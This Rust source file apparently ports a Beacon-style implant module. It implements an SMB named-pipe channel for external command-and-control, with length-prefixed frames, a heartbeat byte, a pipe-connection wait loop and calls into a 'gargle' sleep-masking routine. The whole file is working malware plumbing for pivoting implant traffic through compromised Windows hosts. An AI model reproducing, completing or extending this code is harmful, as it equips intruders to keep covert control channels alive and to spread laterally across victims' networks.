//! Port of client_smb_extc2.cpp — SMB data channel for the external C2
//! Beacon variant.
//!
//! Identical to `client_smb.rs` except the channel's read/write are replaced
//! with pro-forma frame handlers: `link_channel_smb_extc2_read/write` carry a
//! raw 4-byte host-order length on the wire (read via `read_all` from jobs,
//! written via `write_all` from link) instead of the profile frame header.
//! A zero-length write is sent as a single 0x00 heartbeat byte.

use crate::beacon::SETTING_PIPENAME;
use crate::callback::post_error_d;
use crate::client::{client_init, client_process, client_stop, MAX_GET};
use crate::link::{lchannel_smb, write_all, LChannel};
use crate::settings::setting_ptr;
use crate::state;
use parking_lot::Mutex;
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, ERROR_PIPE_CONNECTED, HANDLE, INVALID_HANDLE_VALUE,
};
use windows_sys::Win32::Storage::FileSystem::{FlushFileBuffers, PIPE_ACCESS_DUPLEX};
use windows_sys::Win32::System::Pipes::{
    ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe, PIPE_READMODE_MESSAGE,
    PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES,
};

/// Our named pipe handle (client_smb_extc2.cpp `static HANDLE pipe`).
static PIPE: Mutex<isize> = Mutex::new(0);

/// int link_channel_smb_extc2_read(void * thisp, char * buffer, int max)
unsafe extern "C" fn link_channel_smb_extc2_read(
    thisp: *mut core::ffi::c_void,
    buffer: *mut u8,
    max: usize,
) -> i32 {
    let inst = &mut *(thisp as *mut LChannel);
    let mut get = 0i32;

    /* read our length into a pro-forma frame */
    let rlen = crate::jobs::read_all(inst.pipe, &mut get as *mut i32 as *mut u8, 4);
    if rlen == -1 || rlen != 4 {
        return -1;
    }

    /* sanity check our get value */
    if get > max as i32 {
        return -1;
    }

    crate::jobs::read_all(inst.pipe, buffer, get as usize)
}

/// int link_channel_smb_extc2_write(void * thisp, char * buffer, int length)
unsafe extern "C" fn link_channel_smb_extc2_write(
    thisp: *mut core::ffi::c_void,
    buffer: *const u8,
    length: usize,
) -> i32 {
    let inst = &mut *(thisp as *mut LChannel);

    /* restore old behavior of writing a single byte as our heartbeat, instead of pushing empty frames */
    if length == 0 {
        let empty = 0i32;
        return link_channel_smb_extc2_write(thisp, &empty as *const i32 as *const u8, 1);
    }

    /* build and write our frame header (raw host-order int, as in the C++) */
    if !write_all(inst.pipe, &(length as i32).to_ne_bytes()) {
        return 0; /* FALSE */
    }

    /* write the entire package */
    if write_all(inst.pipe, std::slice::from_raw_parts(buffer, length)) {
        1 /* TRUE */
    } else {
        0 /* FALSE */
    }
}

/* call our gargle function */
unsafe extern "C" fn link_channel_smb_wait(thisp: *mut core::ffi::c_void) {
    let inst = &mut *(thisp as *mut LChannel);
    crate::gargle_pivot_smb::gargle_block_pipe(inst.pipe);
}

/* create a new kind of channel */
fn lchannel_smb_gargle(pipe: isize) -> LChannel {
    let mut channel = lchannel_smb(pipe);
    channel.wait = Some(link_channel_smb_wait);
    channel.read = Some(link_channel_smb_extc2_read);
    channel.write = Some(link_channel_smb_extc2_write);
    channel
}

/*
* wait for a connection to our named pipe
*/
fn smb_wait() {
    let pipe = *PIPE.lock();
    if !crate::gargle_pivot_smb::gargle_pipe_wait(pipe) {
        /* plan B */
        let mut f_connected = 0u32;

        /* wait for a connection to our pipe */
        while f_connected == 0 {
            let ok = unsafe { ConnectNamedPipe(pipe as HANDLE, std::ptr::null_mut()) };
            f_connected = if ok != 0 {
                1
            } else if unsafe { GetLastError() } == ERROR_PIPE_CONNECTED {
                1
            } else {
                0
            };
        }
    }

    /* OK, kick off our client init routine. */
    client_init(lchannel_smb_gargle(pipe));
}

/*
*  init a named pipe
*/
fn smb_init() -> bool {
    /* setup our named pipe please */
    let mut pipename = setting_ptr(SETTING_PIPENAME).unwrap_or(b"").to_vec();
    if !pipename.ends_with(&[0]) {
        pipename.push(0);
    }
    let temps = unsafe {
        CreateNamedPipeA(
            pipename.as_ptr(),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE,
            PIPE_UNLIMITED_INSTANCES,
            MAX_GET as u32,
            MAX_GET as u32,
            0,
            std::ptr::null(),
        )
    };

    /* check for errors and fail now... */
    if temps == INVALID_HANDLE_VALUE {
        post_error_d(0x17, unsafe { GetLastError() } as i32);
        return false;
    }

    /* set post type to POST_SMB now... since everything seems OK */
    state::set_post_type(crate::commands::POST_SMB);

    /* now we can assign the handle */
    *PIPE.lock() = temps as isize;
    true
}

/* stop everything */
fn smb_stop() {
    /* OK, shut everything down! */
    unsafe {
        CloseHandle(*PIPE.lock() as HANDLE);
    }

    /* clean up the resources with our last go */
    client_stop();
}

/*
* put this beacon into a mode where it's waiting for a connection to its pipe
*/
pub fn command_link_wait() {
    /* setup our SMB server */
    if !smb_init() {
        return;
    }

    /* while we are an SMB server... do this stuff */
    while state::sleep_time() > 0 {
        /* wait for a connection and send our agent id */
        smb_wait();

        /* process data */
        client_process();

        /* close the session */
        let pipe = *PIPE.lock();
        unsafe {
            FlushFileBuffers(pipe as HANDLE);
            DisconnectNamedPipe(pipe as HANDLE);
        }
    }

    /* we're no longer an SMB server... stop the shenanigans */
    smb_stop();

    /* just kill the process... it's this or crash */
    crate::thread::safe_exit();
}
